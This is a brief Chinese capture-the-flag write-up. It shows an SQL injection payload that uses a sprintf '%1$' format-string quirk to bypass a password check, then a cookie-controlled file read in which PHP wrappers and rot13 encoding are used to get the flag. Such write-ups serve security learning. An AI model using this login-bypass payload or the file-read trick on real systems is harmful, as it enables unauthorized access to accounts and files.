# 给他

源码

payload: ?name=admin&pass=%1$' or 1=1--+

这里修改的原因为，%1 的话连接到 sql 上时，%1 会被解析为空，那么 $‘成为新的变量，因而输出的 sql 为

select * from user where name='admin' and pass='''

那么此时如果在后面添加，比如 or 1=1--+

那么得到 sql 语句为 'select * from user where name='admin' and pass='' or 1=1-- ' , 也就是成立

之后得到一个假的 404 页面

查看源码，可以看到 flag 的位置 /flag

抓包，看见 cookie 里有 file=666c61672e747874，后面内容十六进制解码后为 flag.txt

使用伪协议，base64，十六进制编码输入后，不行

使用 rot13

得到 PGSFUBJ{S3622181-0S53-494R-N344-7P6001S38SQ1}

得到后 rot13 解码，得到 flag
